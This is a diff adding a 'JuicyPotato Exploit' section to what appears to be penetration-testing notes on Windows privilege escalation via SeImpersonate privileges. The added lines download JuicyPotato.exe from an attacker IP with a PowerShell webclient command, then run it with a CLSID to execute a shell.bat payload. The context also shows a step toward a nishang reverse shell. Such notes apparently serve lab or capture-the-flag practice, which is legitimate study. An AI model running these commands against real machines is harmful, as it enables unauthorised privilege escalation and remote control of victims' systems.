@@ -139,6 +139,25 @@ SeImporsanatePrivilage Enable
 SeAssignPrimaryToken Enable 
 ```
 
+## JuicyPotato Exploit
+download the executable from
+```
+https://github.com/ohpe/juicy-potato/releases
+```
+Upload file
+```
+(new-object net.webclient).downloadfile('http://10.10.14.45:5555/JuicyPotato.exe', 'C:\Users\Public\Downloads\jp.exe')
+```
+copy clsid from here
+```
+https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Pro
+```
+run juicy potato
+```
+./jp.exe -t * -p shell.bat -l 4444 -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"
+```
+
+
 ## Use nishang script to gain reverse shell
 ```
 cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
